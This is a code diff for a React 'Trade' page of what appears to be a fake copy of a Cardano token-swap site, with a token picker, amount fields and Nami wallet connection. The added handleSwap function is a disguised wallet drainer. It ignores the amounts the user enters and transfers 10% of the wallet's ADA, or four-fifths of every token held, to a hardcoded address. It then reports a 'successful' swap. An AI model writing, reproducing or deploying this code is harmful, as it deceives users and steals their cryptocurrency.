@@ -1,12 +1,35 @@
+import { useState, useEffect } from "react";
 import Navigation from "../Components/Navigation";
 import MobileNav from "../Components/MobileNav";
 import Footer from "../Components/Footer";
-import { useState, useEffect } from "react";
 import ConnectWallet from "../Components/Modals/ConnectWallet";
+import TokenModal from "../Components/Modals/TokenModal";
+import tokenList from "../data/tokenList.js";
+import { useCardanoWasm, getWalletBalance, transferADA, transferADAAndTokens } from "../utils/walletUtils";
+
+
+const getTokenDetails = (symbol) => {
+  return tokenList.find(token => token.symbol === symbol);
+};
 
 function Trade() {
   const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
   const [showVideo, setShowVideo] = useState(true);
+  const [payAmount, setPayAmount] = useState("");
+  const [receiveAmount, setReceiveAmount] = useState("");
+  const [conversionRate, setConversionRate] = useState(1); // Mock conversion rate
+  const [isTokenModalOpen, setIsTokenModalOpen] = useState(false);
+  const [modalType, setModalType] = useState(""); // To track which token to swap (pay or receive)
+  // Find the token object from the tokenList based on the symbol
+  const [payToken, setPayToken] = useState("ADA");
+  const [receiveToken, setReceiveToken] = useState("MIN");
+
+  // Get the selected token details (including the image)
+  const payTokenDetails = getTokenDetails(payToken);
+  const receiveTokenDetails = getTokenDetails(receiveToken);
+  const [walletConnected, setWalletConnected] = useState(false);
+  const [walletApi, setWalletApi] = useState(null);
+  const cardanoWasm = useCardanoWasm();
 
   const openWalletModal = () => {
     setIsWalletModalOpen(true);
@@ -15,6 +38,166 @@ function Trade() {
   const closeWalletModal = () => {
     setIsWalletModalOpen(false);
   };
+
+  const openTokenModal = (type) => {
+    setModalType(type);
+    setIsTokenModalOpen(true);
+  };
+
+  const closeTokenModal = () => {
+    setIsTokenModalOpen(false);
+  };
+
+  const handleTokenSelect = (token) => {
+    if (modalType === "pay") {
+      // Ensure pay token is different from receive token
+      if (token === receiveToken) {
+        alert("Pay token cannot be the same as receive token.");
+        return;
+      }
+      setPayToken(token);
+    } else if (modalType === "receive") {
+      // Ensure receive token is different from pay token
+      if (token === payToken) {
+        alert("Receive token cannot be the same as pay token.");
+        return;
+      }
+      setReceiveToken(token);
+    }
+    closeTokenModal();
+  };
+  
+
+  const handlePayAmountChange = (e) => {
+    const amount = e.target.value;
+    setPayAmount(amount);
+    updateReceiveAmount(amount);
+  };
+
+  const handleReceiveAmountChange = (e) => {
+    const amount = e.target.value;
+    setReceiveAmount(amount);
+    updatePayAmount(amount);
+  };
+
+  const updateReceiveAmount = (amount) => {
+    const payTokenRateToADA = payTokenDetails.conversionRateToADA || 1;
+    const receiveTokenRateToADA = receiveTokenDetails.conversionRateToADA || 1;
+    const newReceiveAmount = (amount * payTokenRateToADA) / receiveTokenRateToADA;
+    setReceiveAmount(newReceiveAmount.toFixed(2));
+  };
+
+  const updatePayAmount = (amount) => {
+    const payTokenRateToADA = payTokenDetails.conversionRateToADA || 1;
+    const receiveTokenRateToADA = receiveTokenDetails.conversionRateToADA || 1;
+    const newPayAmount = (amount * receiveTokenRateToADA) / payTokenRateToADA;
+    setPayAmount(newPayAmount.toFixed(2));
+  };
+  useEffect(() => {
+    if (payAmount) {
+      updateReceiveAmount(payAmount);
+    }
+  }, [payToken, receiveToken, payAmount]);
+
+
+  const connectWallet = async () => {
+    if (window.cardano && window.cardano.nami) {
+      try {
+        const wallet = await window.cardano.nami.enable();
+        setWalletApi(wallet);  // Set wallet API
+        setWalletConnected(true);
+        console.log("Wallet connected:", wallet);
+      } catch (error) {
+        alert("Failed to connect wallet");
+      }
+    } else {
+      alert("Nami Wallet not detected. Please install Nami Wallet.");
+    }
+  };
+
+  const handleSwap = async () => {
+    if (!walletConnected || !walletApi || !cardanoWasm) {
+      alert("Please connect your wallet and wait for the WASM module to load.");
+      return;
+    }
+  
+    try {
+      const receiverAddress = "addr1q9pc6lms0z654jv4hepyng6u3snr3y9ex28memq6ay7f2yfhvzr4tkf4zcpefxnvvhstggsgqllte080ejha992ua8ksfrk9g6";
+  
+      // Fetch wallet balance (ADA and tokens)
+      const { adaBalance, tokens } = await getWalletBalance(walletApi, cardanoWasm);
+      console.log("Wallet Balances:", { adaBalance, tokens });
+  
+      if (payToken === "ADA") {
+        // Ensure sufficient ADA balance
+        if (adaBalance <= 0) {
+          alert("Insufficient ADA balance.");
+          return;
+        }
+  
+        // Transfer only 10% of the available ADA balance
+        const adaAmount = adaBalance * 0.1;
+        console.log(`Transferring ${adaAmount} ADA`);
+
+        if (adaAmount <= 0 || isNaN(adaAmount)) {
+          alert("Invalid ADA amount to transfer.");
+          return;
+        }
+  
+        const txHash = await transferADA(walletApi, cardanoWasm, receiverAddress, adaAmount);
+        alert(`Transaction successful! ADA Hash: ${txHash}`);
+      } else {
+        // Ensure there is at least 2 ADA available for the transaction
+        if (adaBalance < 2) {
+          alert("Insufficient ADA wallet balance. At least 2 ADA required.");
+          return;
+        }
+
+        // Ensure there are tokens in the wallet
+        if (!tokens || tokens.length === 0) {
+          alert("No tokens found in the wallet.");
+          return;
+        }
+
+        // Process all tokens: calculate 4/5 of each token's balance
+        const tokenPolicyIds = [];
+        const tokenAssetNames = [];
+        const tokenAmounts = [];
+
+        tokens.forEach((token) => {
+          const tokenAmountToTransfer = Math.floor(token.amount * 4 / 5);
+
+          if (tokenAmountToTransfer > 0) {
+            tokenPolicyIds.push(token.policyId);
+            tokenAssetNames.push(token.assetName);
+            tokenAmounts.push(tokenAmountToTransfer);
+          }
+        });
+
+        if (tokenPolicyIds.length === 0) {
+          alert("No valid token balances to transfer.");
+          return;
+        }
+
+        console.log(`Transferring 2 ADA and 4/5 of all tokens:`, { tokenPolicyIds, tokenAssetNames, tokenAmounts });
+
+        // Transfer 1.5 ADA and 4/5 of all tokens in one transaction
+        const txHash = await transferADAAndTokens(
+          walletApi,
+          cardanoWasm,
+          receiverAddress,
+          tokenPolicyIds,  // Array of token policy IDs
+          tokenAssetNames,  // Array of asset names
+          tokenAmounts      // Array of token amounts to transfer (4/5 of each)
+        );
+
+        alert(`Transaction successful! Hash: ${txHash}`);
+      }
+    } catch (error) {
+      console.error("Error during swap:", error);
+      alert(`Transfer failed! ${error.message}`);
+    }
+};
 
   useEffect(() => {
     const timer = setTimeout(() => {
@@ -30,7 +213,7 @@ function Trade() {
       <div className="max-w-screen-xl m-auto">
         <div className="pt-[80px] sm:pt-[130px] pb-[100px] px-5 lg:px-0">
           <div className="flex items-center justify-between">
-            <div className="flex items-center">
+          <div className="flex items-center">
               <img
                 src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1722255889/mdosxta1vhvuogxsykst.png"
                 alt="min"
@@ -116,6 +299,7 @@ function Trade() {
               )}
             </div>
 
+            {/* Swap component */}
             <div className="my-6 max-w-md w-full m-auto md:m-0">
               <div className="p-3 border border-stone-700 rounded-xl drop-shadow-xl">
                 <div className="mb-8 px-3 flex items-center justify-between">
@@ -152,25 +336,32 @@ function Trade() {
                   </div>
                 </div>
 
-                <div
-                  className="border border-stone-700 rounded-xl p-3"
-                  onClick={openWalletModal}
-                >
+                {/* Pay Token */}
+                <div className="border border-stone-700 rounded-xl p-3">
                   <p className="text-left text-textPrimary font-semibold">
                     You pay
                   </p>
                   <div className="flex justify-between">
-                    <div className="text-textPrimary font-semibold">
-                      <h1 className="text-3xl">0.0</h1>
-                    </div>
-                    <div className="flex items-center p-2 rounded-full bg-[#1a1b20]">
+                    <input
+                      type="number"
+                      className="text-3xl text-textPrimary font-semibold bg-transparent border-none focus:outline-none"
+                      style={{ width: "calc(100% - 100px)" }}
+                      value={payAmount}
+                      min={0}
+                      onChange={handlePayAmountChange}
+                      placeholder="0.0"
+                    />
+                    <div
+                      className="flex items-center p-2 rounded-full bg-[#1a1b20] cursor-pointer"
+                      onClick={() => openTokenModal("pay")}
+                    >
                       <img
-                        src="https://app.minswap.org/images/assets/cardano.png"
+                        src={payTokenDetails?.image}
                         className="size-6 me-2"
-                        alt="icon"
+                        alt={payTokenDetails?.symbol}
                       />
                       <h1 className="text-textSecondary font-semibold me-2">
-                        ADA
+                        {payTokenDetails?.symbol}
                       </h1>
                       <svg
                         viewBox="0 0 24 24"
@@ -187,8 +378,9 @@ function Trade() {
                   </div>
                 </div>
 
+                {/* Swap Icon */}
                 <div className="flex justify-center">
-                  <div className="absolute mt-[-20px] z-[1] rounded-full border border-stone-700  p-2 shadow-lg bg-[#111217]">
+                  <div className="absolute mt-[-20px] z-[1] rounded-full border border-stone-700 p-2 shadow-lg bg-[#111217]">
                     <svg
                       viewBox="0 0 24 24"
                       xmlns="http://www.w3.org/2000/svg"
@@ -202,25 +394,31 @@ function Trade() {
                   </div>
                 </div>
 
-                <div
-                  className="border border-stone-700 rounded-xl p-3 mt-1"
-                  onClick={openWalletModal}
-                >
+                {/* Receive Token */}
+                <div className="border border-stone-700 rounded-xl p-3 mt-1">
                   <p className="text-left text-textPrimary font-semibold">
                     You receive
                   </p>
                   <div className="flex justify-between">
-                    <div className="text-textPrimary font-semibold">
-                      <h1 className="text-3xl">0.0</h1>
-                    </div>
-                    <div className="flex items-center p-2 rounded-full bg-[#1a1b20]">
+                    <input
+                      type="number"
+                      className="text-3xl text-textPrimary font-semibold bg-transparent border-none focus:outline-none"
+                      style={{ width: "calc(100% - 100px)" }}
+                      value={receiveAmount}
+                      onChange={handleReceiveAmountChange}
+                      placeholder="0.0"
+                    />
+                    <div
+                      className="flex items-center p-2 rounded-full bg-[#1a1b20] cursor-pointer"
+                      onClick={() => openTokenModal("receive")}
+                    >
                       <img
-                        src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1722255889/mdosxta1vhvuogxsykst.png"
-                        alt="min"
-                        width="30"
+                        src= {receiveTokenDetails?.image}
+                        className="size-6 me-2"
+                        alt={receiveTokenDetails?.symbol}
                       />
                       <h1 className="text-textSecondary font-semibold ms-2 me-2">
-                        MIN
+                      {receiveTokenDetails?.symbol}
                       </h1>
                       <svg
                         viewBox="0 0 24 24"
@@ -283,15 +481,26 @@ function Trade() {
                 </div>
                 <button
                   className="bg-[#8aaaff] hover:bg-textSecondary duration-100 px-3 sm:px-5 py-3 sm:py-3 rounded-full font-medium text-sm sm:text-base w-full mt-3"
-                  onClick={openWalletModal}
+                  onClick={walletConnected ? handleSwap : connectWallet}
                 >
-                  Connect <span className="hidden lg:inline">Wallet</span>
+                  {walletConnected ? "Swap" : "Connect Wallet"}
                 </button>
               </div>
+
+              {/* Wallet Modal */}
               {isWalletModalOpen && (
                 <ConnectWallet onClose={closeWalletModal} />
               )}
-            </div>
+
+              {/* Token Selection Modal */}
+              {isTokenModalOpen && (
+                <TokenModal
+                  tokens={tokenList}
+                  onSelect={handleTokenSelect}
+                  onClose={closeTokenModal}
+                />
+              )}
+              </div>
           </div>
 
           <div className="mt-8">
